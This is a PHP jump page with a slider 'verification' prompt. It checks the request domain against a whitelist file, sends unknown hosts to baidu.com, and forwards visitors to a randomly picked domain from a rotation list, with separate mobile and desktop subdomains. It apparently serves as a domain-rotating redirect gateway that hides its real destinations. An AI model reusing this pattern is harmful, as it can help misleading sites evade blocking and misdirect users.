<?php
function isMobile() 
{
    static $is_mobile = null;
    if ( isset( $is_mobile ) ) {
        return $is_mobile;
    }
    if ( empty($_SERVER['HTTP_USER_AGENT']) ) {
        $is_mobile = false;
    } elseif ( strpos($_SERVER['HTTP_USER_AGENT'], 'Mobile') !== false || strpos($_SERVER['HTTP_USER_AGENT'], 'Android') !== false || strpos($_SERVER['HTTP_USER_AGENT'], 'Silk/') !== false || strpos($_SERVER['HTTP_USER_AGENT'], 'Kindle') !== false || strpos($_SERVER['HTTP_USER_AGENT'], 'BlackBerry') !== false || strpos($_SERVER['HTTP_USER_AGENT'], 'Opera Mini') !== false || strpos($_SERVER['HTTP_USER_AGENT'], 'Opera Mobi') !== false ) {
        $is_mobile = true;
    } else {
        $is_mobile = false;
    }
    return $is_mobile;
}
function onHttps() 
{
    return true;
    if (defined('HTTPS') && HTTPS) return true;
    if (!isset($_SERVER)) return false;
    if (!isset($_SERVER['HTTPS'])) return false;
    if ($_SERVER['HTTPS'] === 1) {  //Apache
        return true;
    } elseif ($_SERVER['HTTPS'] === 'on') { //IIS
        return true;
    } elseif ($_SERVER['SERVER_PORT'] == 443) { //其他
        return true;
    }
    return false;
}
/**
 * 取得根域名
 * @param type $domain 域名
 * @return string 返回根域名
 */
function GetUrlToDomain($domain) 
{
    $re_domain = '';
    $domain_postfix_cn_array = array("com", "net", "org", "gov", "edu", "com.cn", "cn");
    $array_domain = explode(".", $domain);
    $array_num = count($array_domain) - 1;
    if ($array_domain[$array_num] == 'cn') {
        if (in_array($array_domain[$array_num - 1], $domain_postfix_cn_array)) {
            $re_domain = $array_domain[$array_num - 2] . "." . $array_domain[$array_num - 1] . "." . $array_domain[$array_num];
        } else {
            $re_domain = $array_domain[$array_num - 1] . "." . $array_domain[$array_num];
        }
    } else {
        $re_domain = $array_domain[$array_num - 1] . "." . $array_domain[$array_num];
    }
    return $re_domain;
}

$DOMAIN = GetUrlToDomain($_SERVER['HTTP_HOST']);

$arr = explode('.',$_SERVER['HTTP_HOST']);

if($arr[0] == 'dn' || $arr[0] == 'sj'){
    header("Location:" . (onHttps() ? 'https://' : 'http://') . $DOMAIN);
    exit;
}

$inlet = array_filter(explode("\r\n", trim(@file_get_contents('inlet.txt'),"\r\n")));
if(empty($inlet)){
    header("Location:https://www.baidu.com");
    exit;
}
shuffle($inlet);
if(!in_array($DOMAIN,$inlet)){
    header("Location:https://www.baidu.com");
    exit;
}

$project = explode("\r\n", trim(@file_get_contents('project.txt'),"\r\n"));
if(empty($project)){
    die;
}
foreach ($project as $key=>$value) {
    if($value == $DOMAIN){
        unset($project[$key]);
    }
}
shuffle($project);
$DOMAIN = $project[0];
if(isMobile()){
    $DOMAIN = (onHttps() ? 'https://' : 'http://').'sj.'.$DOMAIN.'/99/index';
}else{
    $DOMAIN = (onHttps() ? 'https://' : 'http://').'dn.'.$DOMAIN.'/99/home';
}

?>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0,user-scalable=no" />
    <meta name="apple-touch-fullscreen" content="yes" />
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <meta name="apple-mobile-web-app-status-bar-style" content="black" />
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta content="yes" name="apple-mobile-web-app-capable">
    <meta content="telephone=no,email=no" name="format-detection">
    <title>加载中...</title>
    <link href="/favicon.ico" rel="shortcut icon">
    <link rel="stylesheet" href="/static/check/css/drag.css?e=223654">
    <script src="/static/check/js/jquery.min.js"></script>
    <script src="/static/check/js/drag.js?jw=32454"></script>
    <style type="text/css">
        .slidetounlock{
            font-size: 12px;
            background:-webkit-gradient(linear,left top,right top,color-stop(0,#4d4d4d),color-stop(.4,#4d4d4d),color-stop(.5,#fff),color-stop(.6,#4d4d4d),color-stop(1,#4d4d4d));
            -webkit-background-clip:text;
            -webkit-text-fill-color:transparent;
            -webkit-animation:slidetounlock 3s infinite;
            -webkit-text-size-adjust:none
        }
        @-webkit-keyframes slidetounlock{0%{background-position:-200px 0} 100%{background-position:200px 0}}
    </style>
</head>
<body ontouchstart="return false;" ontouchmove="return false;" ontouchend="return false;" >
<div id="wrapper" >
    <div id='item' >
        <div style="margin-bottom: 10px;" >
            请完成以下验证后继续
        </div>
        <img id="img" src="" />
        <div id="drag">
            <div class="drag_bg"></div>
            <div class="drag_text slidetounlock" onselectstart="return false;" unselectable="on">
                点击左边圆圈验证
            </div>
            <div class="handler handler_bg" style="background: #FF571D;"></div>
        </div>
    </div>
</div>
<script>
    var __root_path__ = "/static",_jump_url = "<?php echo $DOMAIN; ?>";
    $('#drag').drag();
    var src=__root_path__ + '/img/'+ Math.floor( Math.random()*9)+'.jpg';
    console.log(src);
    $('#img').attr('src',src)
</script>
</body>
</html>
